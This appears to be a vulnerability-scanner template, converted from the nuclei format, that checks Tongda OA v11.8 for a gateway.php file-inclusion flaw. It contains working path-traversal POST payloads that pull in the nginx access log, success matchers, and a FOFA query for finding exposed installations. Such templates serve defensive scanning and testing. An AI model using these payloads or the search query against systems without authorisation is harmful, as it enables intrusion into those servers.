@@ -1,0 +1,121 @@
+{
+  "id": "tongda-getway-rfi",
+  "name": "Tongda OA v11.8 getway.php  - Remote File Inclution",
+  "author": "SleepingBag945,pussycat0x",
+  "severity": "CRITICAL",
+  "description": "There is a file inclusion vulnerability in Tongda OA v11.8 getway.php, an attacker sends a malicious request to include a log file, resulting in an arbitrary file writing vulnerability\n",
+  "references": [
+    "https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA%20v11.8%20getway.php%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.md"
+  ],
+  "tags": [
+    "tongda",
+    "rfi"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"TDXK-通达OA\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /ispirit/interface/gateway.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\n\njson\u003d{\"url\":\"/general/../../nginx/logs/oa.access.log\"}\n",
+        "POST /mac/gateway.php HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 54\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\n\njson\u003d{\"url\":\"/general/../../nginx/logs/oa.access.log\"}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(body_1, \"ERROR URL\")",
+            "contains(body_2, \u0027GET\u0027) || contains(body_2, \u0027POST\u0027)",
+            "status_code_1\u003d\u003d200 \u0026\u0026 status_code_2 \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "tongda-getway-rfi",
+    "info": {
+      "name": "Tongda OA v11.8 getway.php  - Remote File Inclution",
+      "author": "SleepingBag945,pussycat0x",
+      "severity": "critical",
+      "description": "There is a file inclusion vulnerability in Tongda OA v11.8 getway.php, an attacker sends a malicious request to include a log file, resulting in an arbitrary file writing vulnerability\n",
+      "reference": [
+        "https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA%20v11.8%20getway.php%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.md"
+      ],
+      "metadata": {
+        "max_request": 2,
+        "fofa_query": "app\u003d\"TDXK-通达OA\""
+      },
+      "tags": "tongda,rfi"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /ispirit/interface/gateway.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\n\njson\u003d{\"url\":\"/general/../../nginx/logs/oa.access.log\"}\n",
+          "POST /mac/gateway.php HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 54\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\n\njson\u003d{\"url\":\"/general/../../nginx/logs/oa.access.log\"}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(body_1, \"ERROR URL\")",
+              "contains(body_2, \u0027GET\u0027) || contains(body_2, \u0027POST\u0027)",
+              "status_code_1\u003d\u003d200 \u0026\u0026 status_code_2 \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
